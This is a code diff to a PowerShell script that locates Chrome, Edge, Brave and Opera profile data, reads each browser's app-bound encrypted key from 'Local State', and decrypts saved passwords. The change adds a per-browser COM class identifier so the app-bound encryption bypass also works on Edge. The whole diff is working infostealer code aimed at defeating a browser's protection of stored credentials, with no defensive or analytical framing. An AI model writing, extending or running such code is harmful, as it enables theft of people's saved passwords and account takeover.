@@ -147,7 +147,7 @@ function Grab($src, $dest) {
   return $false
 }
 
-function Read-Key([string]$statePath) {
+function Read-Key([string]$statePath, [string]$clsid) {
   if (-not (Test-Path $statePath)) { return @{ k = $null; abe = $null } }
   try { $j = Get-Content -Raw -Path $statePath | ConvertFrom-Json } catch { return @{ k = $null; abe = $null } }
   $out = @{ k = $null; abe = $null }
@@ -159,7 +159,7 @@ function Read-Key([string]$statePath) {
   $abe = $j.os_crypt.app_bound_encrypted_key
   if ($abe) {
     $b2 = [Convert]::FromBase64String($abe)
-    if ($b2.Length -gt 4) { $out.abe = [Crypt]::Abe($b2[4..($b2.Length - 1)], [Guid]"708860E0-F641-4611-8895-7D867DD3675B") }
+    if ($b2.Length -gt 4 -and $clsid) { $out.abe = [Crypt]::Abe($b2[4..($b2.Length - 1)], [Guid]$clsid) }
   }
   return $out
 }
@@ -186,9 +186,9 @@ function Decrypt-Pw($hex, $keys) {
 }
 
 $browsers = @(
-  @{ n = "Chrome";  p = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
-  @{ n = "Edge";    p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
-  @{ n = "Brave";   p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
+  @{ n = "Chrome";  p = "$env:LOCALAPPDATA\Google\Chrome\User Data"; c = "708860E0-F641-4611-8895-7D867DD3675B" },
+  @{ n = "Edge";    p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"; c = "1FCBE96C-1697-43AF-9140-14B1C1F2A1B7" },
+  @{ n = "Brave";   p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; c = "708860E0-F641-4611-8895-7D867DD3675B" },
   @{ n = "Opera";   p = "$env:APPDATA\Opera Software\Opera Stable" }
 )
 
@@ -198,7 +198,7 @@ New-Item -ItemType Directory -Force -Path $tmp | Out-Null
 
 foreach ($b in $browsers) {
   if (-not (Test-Path $b.p)) { continue }
-  $keys = Read-Key (Join-Path $b.p "Local State")
+  $keys = Read-Key (Join-Path $b.p "Local State") $b.c
   $profiles = @()
   if (Test-Path (Join-Path $b.p "Default")) { $profiles += (Join-Path $b.p "Default") }
   $profiles += (Get-ChildItem -Path $b.p -Directory -Filter "Profile *" | ForEach-Object { $_.FullName })
